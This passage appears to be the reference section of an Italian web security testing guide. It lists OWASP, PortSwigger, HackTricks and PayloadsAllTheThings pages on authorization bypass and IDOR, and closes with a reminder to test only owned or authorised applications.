* [OWASP — Bypassing Authorization Schema](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema)
* [OWASP API1:2023 — Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
* [PortSwigger — Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
* [PortSwigger — Testing Access Controls with Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/access-controls)

### Fonti operative

* [HackTricks — Web API Pentesting](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/web-api-pentesting.html)
* [HackTricks — IDOR](https://hacktricks.wiki/en/pentesting-web/idor.html)
* [PayloadsAllTheThings — IDOR](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Direct%20Object%20References/)
* [PayloadsAllTheThings — GraphQL](https://swisskyrepo.github.io/PayloadsAllTheThings/GraphQL%20Injection/)
* [Hackviser — HTTP/HTTPS Pentesting](https://hackviser.com/tactics/pentesting/services/http)

> Utilizza queste tecniche esclusivamente su applicazioni di tua proprietà o per le quali possiedi un’autorizzazione esplicita.
